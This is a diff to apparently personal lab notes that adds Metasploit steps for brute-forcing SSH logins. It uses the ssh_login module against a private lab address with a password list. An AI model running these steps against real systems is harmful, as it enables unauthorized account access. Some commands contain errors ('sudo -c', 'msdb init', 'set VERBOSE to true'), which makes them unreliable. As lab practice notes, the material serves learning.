@@ -57,7 +57,23 @@ Steps:
 sudo -u postgresql psql -c "CREATE USER $USER WITH PASSWORD 'password';"  
 sudo -u postgresql psql -c "ALTER USER $USER CREATEDB;"  
 sudo -c postgresql psql -c "GRANT ALL PRIVILEGES ON DATABASE msf_database to $USER;"  
-Then run sudo msdb init.  
+Then run sudo msdb init, and then msfconsole to get it up.  
+To get it to run type use auxillary/scanner/ssh/ssh_login  
+show options  
+set RHOSTS 10.0.0.20  
+set RPORT 2222  
+set USERNAME jon *or whatever else*  
+set PASS_FILE passwords.txt  
+set THREADS 5  
+set VERBOSE to true  
+show options  
+type run  
+And the result:  
+<img width="486" height="323" alt="image" src="https://github.com/user-attachments/assets/d7275de1-c30b-4334-9558-475f75b42516" />  
+<img width="520" height="357" alt="image" src="https://github.com/user-attachments/assets/5ccf0c8a-8c10-4b33-92a0-9919b0fba1e7" />  
+You will need to set Allow Users to something else, set KBDInteractive line to no, and maybe or two others.  
+
+
 
 
 
